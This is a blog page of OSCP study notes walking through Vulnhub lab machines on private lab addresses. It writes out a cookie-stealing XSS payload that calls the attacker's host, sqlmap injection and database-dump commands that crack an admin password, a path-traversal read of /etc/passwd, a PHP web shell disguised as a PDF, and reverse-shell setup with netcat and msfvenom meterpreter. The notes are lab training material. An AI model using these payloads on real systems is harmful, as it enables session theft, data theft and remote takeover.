<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="OSCP Study Notes - 2021/03/12"><meta name="keywords" content="OSCP,Study Notes,Penetration Testing"><meta name="author" content="Gavin Cui"><meta name="copyright" content="Gavin Cui"><title>OSCP Study Notes - 2021/03/12 | Gavin's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-Site-Scripting"><span class="toc-number">1.</span> <span class="toc-text">Cross-Site Scripting</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">2.</span> <span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Potential-Sql-injection-position"><span class="toc-number">2.1.</span> <span class="toc-text">Potential Sql injection position:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lets-try-sqlmap-first"><span class="toc-number">2.2.</span> <span class="toc-text">Lets try sqlmap first</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Local-File-Inclusion"><span class="toc-number">3.</span> <span class="toc-text">Local File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-reverse-shell"><span class="toc-number">3.0.1.</span> <span class="toc-text">php reverse shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Remote-File-Inclusion"><span class="toc-number">4.</span> <span class="toc-text">Remote File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Host-a-file"><span class="toc-number">4.1.</span> <span class="toc-text">Host a file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Other-things"><span class="toc-number">4.2.</span> <span class="toc-text">Other things:</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gavin Cui</div><div class="author-info__description text-center">No Description</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">20</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">6</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gavin's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">OSCP Study Notes - 2021/03/12</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-12</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>Vulnhub Box: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/">XSS &amp; MySQL FILE</a></p>
<h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><p>Find the IP address using netdiscover: <code>192.168.119.134</code></p>
<p>Test by add to box</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;helloxss&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>Create a php script:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test&quot;</span>]) ?<span class="variable">$_GET</span>[<span class="string">&quot;test&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Start a php server:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 stop</span><br><span class="line">php -S 192.168.119.132:80</span><br><span class="line"># -S &lt;addr&gt;:&lt;port&gt; Run with built-in web server.</span><br></pre></td></tr></table></figure>

<p>Inject javascript to comment box:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href&#x3D;&#39;http:&#x2F;&#x2F;192.168.119.132&#x2F;index.php?test&#x3D;&#39;+document.cookie;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>Then get a bounch of cookies:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Fri Mar 12 14:06:59 2021] 192.168.119.134:37106 [200]: GET &#x2F;index.php?test&#x3D;PHPSESSID&#x3D;h576adtob2huvem6m28ndk6lm5</span><br><span class="line">[Fri Mar 12 14:06:59 2021] 192.168.119.134:37106 Closing</span><br><span class="line">[Fri Mar 12 14:08:00 2021] 192.168.119.134:37110 Accepted</span><br><span class="line">[Fri Mar 12 14:08:00 2021] 192.168.119.134:37110 [200]: GET &#x2F;index.php?test&#x3D;PHPSESSID&#x3D;k0u7iarj89i203m84udm5ve7r5</span><br><span class="line">[Fri Mar 12 14:08:00 2021] 192.168.119.134:37110 Closing</span><br><span class="line">[Fri Mar 12 14:08:59 2021] 192.168.119.134:37114 Accepted</span><br><span class="line">[Fri Mar 12 14:08:59 2021] 192.168.119.134:37114 [200]: GET &#x2F;index.php?test&#x3D;PHPSESSID&#x3D;ioephhq6n3efntimq0nb2hfv26</span><br><span class="line">[Fri Mar 12 14:08:59 2021] 192.168.119.134:37114 Closing</span><br><span class="line">[Fri Mar 12 14:09:59 2021] 192.168.119.134:37118 Accepted</span><br><span class="line">[Fri Mar 12 14:09:59 2021] 192.168.119.134:37118 [200]: GET &#x2F;index.php?test&#x3D;PHPSESSID&#x3D;56lch59vt5c10o40lutelou564</span><br><span class="line">[Fri Mar 12 14:09:59 2021] 192.168.119.134:37118 Closing</span><br><span class="line">[Fri Mar 12 14:10:59 2021] 192.168.119.134:37122 Accepted</span><br><span class="line">[Fri Mar 12 14:10:59 2021] 192.168.119.134:37122 [200]: GET &#x2F;index.php?test&#x3D;PHPSESSID&#x3D;tal24ib05acs49vaf2i39r6jh7</span><br><span class="line">[Fri Mar 12 14:10:59 2021] 192.168.119.134:37122 Closing</span><br><span class="line">[Fri Mar 12 14:11:59 2021] 192.168.119.134:37126 Accepted</span><br></pre></td></tr></table></figure>

<p>Download Cookie_manager_plus plugin<br>add the cookie, refresh and open click the admin  </p>
<p>Login as admin !!</p>
<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>Go to the login page  </p>
<p>Check the Sql injection cheat sheet, search Pentest lab sql injection cheat sheet<br><a target="_blank" rel="noopener" href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/</a>  </p>
<h2 id="Potential-Sql-injection-position"><a href="#Potential-Sql-injection-position" class="headerlink" title="Potential Sql injection position:"></a>Potential Sql injection position:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.119.134&#x2F;post.php?id&#x3D;3</span><br></pre></td></tr></table></figure>
<p><code>?id=3</code></p>
<h2 id="Lets-try-sqlmap-first"><a href="#Lets-try-sqlmap-first" class="headerlink" title="Lets try sqlmap first"></a>Lets try sqlmap first</h2><p><strong>not allowed in the exam</strong>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.119.134&#x2F;post.php?id&#x3D;1&quot;</span><br><span class="line">[15:04:32] [WARNING] GET parameter &#39;id&#39; does not seem to be injectable</span><br></pre></td></tr></table></figure>

<p>or </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.119.134&#x2F;admin&#x2F;edit.php?id&#x3D;1&quot; --cookie&#x3D;PHPSESSID&#x3D;79fi4mj2s3lq39p0fmdmnpdpd1</span><br></pre></td></tr></table></figure>
<p>if know the cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1 AND 7510&#x3D;7510</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1 AND (SELECT 5982 FROM (SELECT(SLEEP(5)))lOqF)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: id&#x3D;-9410 UNION ALL SELECT NULL,NULL,CONCAT(0x7171706a71,0x716c664c74636976635573484b575956527471614e56527a524b527a4a76687a4a78454267716675,0x7171787871),NULL-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>Dump the databse:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.119.134&#x2F;admin&#x2F;edit.php?id&#x3D;1&quot; --cookie&#x3D;PHPSESSID&#x3D;79fi4mj2s3lq39p0fmdmnpdpd1 --dump</span><br><span class="line">[15:24:33] [INFO] cracked password &#39;P4ssw0rd&#39; for user &#39;admin&#39;                                                      </span><br><span class="line">Database: blog                                                                                                      </span><br><span class="line">Table: users</span><br><span class="line">[1 entry]</span><br><span class="line">+----+-------+---------------------------------------------+</span><br><span class="line">| id | login | password                                    |</span><br><span class="line">+----+-------+---------------------------------------------+</span><br><span class="line">| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |</span><br><span class="line">+----+-------+---------------------------------------------+</span><br><span class="line"></span><br><span class="line">+----+---------+--------------------------------------------------------------------------------------------------+---------+---------+-----------+</span><br><span class="line">| id | post_id | text                                                                                             | title   | author  | published |</span><br><span class="line">+----+---------+--------------------------------------------------------------------------------------------------+---------+---------+-----------+</span><br><span class="line">| 1  | 2       | &lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;                                                                    | &lt;blank&gt; | &lt;blank&gt; | NULL      |</span><br><span class="line">| 2  | 2       |         &lt;script&gt;location.href&#x3D;&#39;http:&#x2F;&#x2F;192.168.119.132&#x2F;index.php?test&#x3D;&#39;+document.cookie;&lt;&#x2F;script&gt; | &lt;blank&gt; | &lt;blank&gt; | NULL      |</span><br><span class="line">| 3  | 3       |         rt                                                                                       | df      | df      | NULL      |</span><br><span class="line">| 4  | 3       |         &lt;script&gt;location.href&#x3D;&#39;http:&#x2F;&#x2F;192.168.119.132&#x2F;index.php?test&#x3D;&#39;+document.cookie;&lt;&#x2F;script&gt; | &lt;blank&gt; | &lt;blank&gt; | NULL      |</span><br><span class="line">| 5  | 1       |         &lt;script&gt;location.href&#x3D;&#39;http:&#x2F;&#x2F;192.168.119.132&#x2F;index.php?test&#x3D;&#39;+document.cookie;&lt;&#x2F;script&gt; | &lt;blank&gt; | &lt;blank&gt; | NULL      |</span><br><span class="line">+----+---------+--------------------------------------------------------------------------------------------------+---------+---------+-----------+</span><br></pre></td></tr></table></figure>
<p>try login page:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.119.134&#x2F;admin&#x2F;login.php&quot; --data&#x3D;&quot;user&#x3D;hello&amp;password&#x3D;23c&quot;</span><br></pre></td></tr></table></figure>


<h1 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h1><p>Vulhunb: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/pentester-lab-php-include-and-post-exploitation,79/">https://www.vulnhub.com/entry/pentester-lab-php-include-and-post-exploitation,79/</a></p>
<p>Use nikto:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">nikto -h 192.168.119.135</span><br><span class="line"></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.119.135</span><br><span class="line">+ Target Hostname:    192.168.119.135</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2021-03-12 20:47:51 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;2.2.16 (Debian)</span><br><span class="line">+ Retrieved x-powered-by header: PHP&#x2F;5.3.2</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Apache&#x2F;2.2.16 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to &#x2F;images over HTTP&#x2F;1.0. The value is &quot;127.0.0.1&quot;.</span><br><span class="line">+ Uncommon header &#39;tcn&#39; found, with contents: list</span><br><span class="line">+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http:&#x2F;&#x2F;www.wisec.it&#x2F;sectou.php?id&#x3D;4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.php</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ &#x2F;index.php: PHP include error may indicate local or remote file inclusion is possible.</span><br><span class="line">+ OSVDB-3126: &#x2F;submit?setoption&#x3D;q&amp;option&#x3D;allowed_ips&amp;value&#x3D;255.255.255.255: MLdonkey 2.x allows administrative interface access to be access from any IP. This is typically only found on port 4080.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3268: &#x2F;css&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;css&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;login&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3268: &#x2F;icons&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3268: &#x2F;images&#x2F;: Directory indexing found.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file &#x2F;icons&#x2F;README, inode: 3472, size: 5108, mtime: Tue Aug 28 06:48:10 2007</span><br><span class="line">+ OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</span><br><span class="line">+ &#x2F;login.php: Admin login page&#x2F;section found.</span><br><span class="line">+ 8725 requests: 0 error(s) and 23 item(s) reported on remote host</span><br><span class="line">+ End Time:           2021-03-12 20:48:20 (GMT-5) (29 seconds)</span><br></pre></td></tr></table></figure>
<p>but found</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.119.13(5&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br></pre></td></tr></table></figure>
<p>not be able to scan anything, </p>
<p>Create a pdf file</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.4</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>the file goes to upload folder <strong>how to know that?</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.119.135&#x2F;index.php?page&#x3D;uploads&#x2F;shell.pdf%00&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure>
<p>%00 tell php ignore following content</p>
<h3 id="php-reverse-shell"><a href="#php-reverse-shell" class="headerlink" title="php reverse shell"></a>php reverse shell</h3><p><a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a>  </p>
<p>add <code>%PDF-1.4</code> to make it looks like a pdf file<br>modify ip and port in the script  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>

<p>get the shell now<br>next step: privielege escalation<br>find a folder you have full control  </p>
<h1 id="Remote-File-Inclusion"><a href="#Remote-File-Inclusion" class="headerlink" title="Remote File Inclusion"></a>Remote File Inclusion</h1><p>create malicious payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.119.132 LPORT&#x3D;444 &gt;&gt; exploit.php</span><br></pre></td></tr></table></figure>
<h2 id="Host-a-file"><a href="#Host-a-file" class="headerlink" title="Host a file"></a>Host a file</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 stop</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html </span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
<p>this one need to use metasploit handler to receive connection, so maybe use php-reverse-shell for exam  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.119.132</span><br><span class="line">set LPORT 4444</span><br></pre></td></tr></table></figure>

<h2 id="Other-things"><a href="#Other-things" class="headerlink" title="Other things:"></a>Other things:</h2><p>find a good blog: <a target="_blank" rel="noopener" href="https://netosec.com/my-journey-through-oscp/">My journey through OSCP</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Gavin Cui</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://gavincrz.github.io/2021/03/12/OSCP-Study-Notes-2021-03-12/">https://gavincrz.github.io/2021/03/12/OSCP-Study-Notes-2021-03-12/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/OSCP/">OSCP</a><a class="post-meta__tags" href="/tags/Study-Notes/">Study Notes</a><a class="post-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/03/13/Study-Notes-2021-03-13/"><i class="fa fa-chevron-left">  </i><span>Study Notes - 2021/03/13</span></a></div><div class="next-post pull-right"><a href="/2021/03/11/OSCP-Study-Notes-2021-03-11/"><span>OSCP Study Notes - 2021/03/11</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By Gavin Cui</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>